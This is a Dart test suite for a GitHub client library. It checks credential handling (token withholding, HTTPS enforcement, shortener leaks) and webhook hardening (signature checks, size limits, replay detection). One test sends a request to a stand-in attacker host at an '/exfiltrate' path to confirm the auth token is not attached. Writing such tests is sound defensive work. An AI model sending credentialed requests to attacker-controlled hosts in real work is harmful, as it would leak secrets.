import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:crypto/crypto.dart';
import 'package:github/github.dart';
import 'package:github/hooks.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';
import 'package:test/test.dart';

void main() {
  group('Security - Credential boundaries', () {
    test('does not send Authorization header to untrusted absolute URL',
        () async {
      http.Request? capturedRequest;
      final mockClient = MockClient((r) async {
        capturedRequest = r;
        return http.Response('{}', 200,
            headers: {'content-type': 'application/json'});
      });

      final gh = GitHub(
        auth: const Authentication.withToken('super-secret-token'),
        client: mockClient,
      );

      await gh.request('GET', 'https://attacker.example.com/exfiltrate');
      expect(capturedRequest, isNotNull);
      expect(capturedRequest!.headers.containsKey('Authorization'), isFalse);
    });

    test('sends Authorization header to trusted endpoint origin', () async {
      http.Request? capturedRequest;
      final mockClient = MockClient((r) async {
        capturedRequest = r;
        return http.Response('{}', 200,
            headers: {'content-type': 'application/json'});
      });

      final gh = GitHub(
        auth: const Authentication.withToken('super-secret-token'),
        client: mockClient,
      );

      await gh.request('GET', '/user');
      expect(capturedRequest, isNotNull);
      expect(capturedRequest!.headers['Authorization'],
          'token super-secret-token');
    });

    test('sends Authorization header to trusted uploads origin', () async {
      http.Request? capturedRequest;
      final mockClient = MockClient((r) async {
        capturedRequest = r;
        return http.Response('{}', 200,
            headers: {'content-type': 'application/json'});
      });

      final gh = GitHub(
        auth: const Authentication.withToken('super-secret-token'),
        client: mockClient,
      );

      await gh.request('POST',
          'https://uploads.github.com/repos/org/repo/releases/1/assets');
      expect(capturedRequest, isNotNull);
      expect(capturedRequest!.headers['Authorization'],
          'token super-secret-token');
    });

    test('disallows authenticated requests over insecure HTTP by default',
        () async {
      final mockClient = MockClient((r) async => http.Response('{}', 200));

      final gh = GitHub(
        endpoint: 'http://api.github.com',
        auth: const Authentication.withToken('super-secret-token'),
        client: mockClient,
      );

      expect(
        () => gh.request('GET', '/user'),
        throwsA(isA<GitHubError>().having(
          (e) => e.message,
          'message',
          contains('Insecure HTTP authentication is disallowed by default'),
        )),
      );
    });

    test(
        'allows authenticated requests over HTTP when allowInsecureAuth is true',
        () async {
      http.Request? capturedRequest;
      final mockClient = MockClient((r) async {
        capturedRequest = r;
        return http.Response('{}', 200,
            headers: {'content-type': 'application/json'});
      });

      final gh = GitHub(
        endpoint: 'http://localhost:3000',
        auth: const Authentication.withToken('local-token'),
        client: mockClient,
        allowInsecureAuth: true,
      );

      await gh.request('GET', '/user');
      expect(capturedRequest, isNotNull);
      expect(capturedRequest!.headers['Authorization'], 'token local-token');
    });

    test('UrlShortenerService does not leak GitHub credentials and uses HTTPS',
        () async {
      http.Request? capturedRequest;
      final mockClient = MockClient((r) async {
        capturedRequest = r;
        return http.Response('{}', 201, headers: {
          'location': 'https://git.io/abcd',
          'content-type': 'application/json'
        });
      });

      final gh = GitHub(
        auth: const Authentication.withToken('super-secret-token'),
        client: mockClient,
      );

      // ignore: deprecated_member_use_from_same_package
      final shortener = UrlShortenerService(gh);
      final code =
          // ignore: deprecated_member_use_from_same_package
          await shortener.shortenUrl('https://github.com/SpinlockLabs');

      expect(code, 'abcd');
      expect(capturedRequest, isNotNull);
      expect(capturedRequest!.url.scheme, 'https');
      expect(capturedRequest!.url.host, 'git.io');
      expect(capturedRequest!.headers.containsKey('Authorization'), isFalse);
    });
  });

  group('Security - Webhook verification and hardening', () {
    late HookServer server;
    late int port;

    setUp(() async {
      final socket = await ServerSocket.bind('127.0.0.1', 0);
      port = socket.port;
      await socket.close();
    });

    tearDown(() async {
      await server.stop();
    });

    test('rejects non-POST methods with 405', () async {
      server = HookServer(port, '127.0.0.1');
      await server.start();

      final client = HttpClient();
      final req = await client.getUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      final res = await req.close();
      expect(res.statusCode, HttpStatus.methodNotAllowed);
      final body = await utf8.decoder.bind(res).join();
      expect(jsonDecode(body)['error'], 'Method Not Allowed');
      client.close();
    });

    test('rejects requests missing X-GitHub-Event header with 400', () async {
      server = HookServer(port, '127.0.0.1');
      await server.start();

      final client = HttpClient();
      final req =
          await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'created'}));
      final res = await req.close();
      expect(res.statusCode, HttpStatus.badRequest);
      final body = await utf8.decoder.bind(res).join();
      expect(jsonDecode(body)['error'], 'Bad Request');
      client.close();
    });

    test(
        'rejects requests when secret configured and signature missing or invalid',
        () async {
      server = HookServer(port, '127.0.0.1', 'webhook-secret-key');
      await server.start();

      final client = HttpClient();

      // Missing signature
      var req = await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'opened'}));
      var res = await req.close();
      expect(res.statusCode, HttpStatus.unauthorized);

      // Invalid signature
      req = await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.set('X-Hub-Signature-256', 'sha256=invalidhex0000');
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'opened'}));
      res = await req.close();
      expect(res.statusCode, HttpStatus.unauthorized);

      client.close();
    });

    test('accepts requests with valid HMAC-SHA256 signature', () async {
      const secret = 'my-webhook-secret';
      server = HookServer(port, '127.0.0.1', secret);
      await server.start();

      HookEvent? receivedEvent;
      server.onEvent.listen((e) => receivedEvent = e);

      final payload = jsonEncode({'action': 'opened'});
      final payloadBytes = utf8.encode(payload);
      final hmac = Hmac(sha256, utf8.encode(secret));
      final signature = 'sha256=${hmac.convert(payloadBytes)}';

      final client = HttpClient();
      final req =
          await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.set('X-Hub-Signature-256', signature);
      req.headers.contentType = ContentType.json;
      req.add(payloadBytes);
      final res = await req.close();

      expect(res.statusCode, HttpStatus.ok);
      await Future<void>.delayed(const Duration(milliseconds: 20));
      expect(receivedEvent, isA<IssueEvent>());
      expect((receivedEvent as IssueEvent).action, 'opened');
      client.close();
    });

    test('rejects requests exceeding maxBodySize with 413', () async {
      server = HookServer(port, '127.0.0.1', null, 50); // max 50 bytes
      await server.start();

      final client = HttpClient();
      final req =
          await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'a' * 100}));
      final res = await req.close();

      expect(res.statusCode, HttpStatus.requestEntityTooLarge);
      client.close();
    });

    test('rejects malformed JSON with 400', () async {
      server = HookServer(port, '127.0.0.1');
      await server.start();

      final client = HttpClient();
      final req =
          await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.contentType = ContentType.json;
      req.write('{malformed json string...');
      final res = await req.close();

      expect(res.statusCode, HttpStatus.badRequest);
      client.close();
    });

    test('detects replay attack when onReplayCheck returns false', () async {
      final seenDeliveries = <String>{};
      server =
          HookServer(port, '127.0.0.1', null, 1024 * 1024, seenDeliveries.add);
      await server.start();

      final client = HttpClient();

      // First delivery: succeeds
      var req = await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.set('X-GitHub-Delivery', 'delivery-uuid-1');
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'opened'}));
      var res = await req.close();
      expect(res.statusCode, HttpStatus.ok);

      // Replay of same delivery ID: rejected with 409
      req = await client.postUrl(Uri.parse('http://127.0.0.1:$port/hook'));
      req.headers.set('X-GitHub-Event', 'issues');
      req.headers.set('X-GitHub-Delivery', 'delivery-uuid-1');
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'action': 'opened'}));
      res = await req.close();
      expect(res.statusCode, HttpStatus.conflict);

      client.close();
    });
  });
}
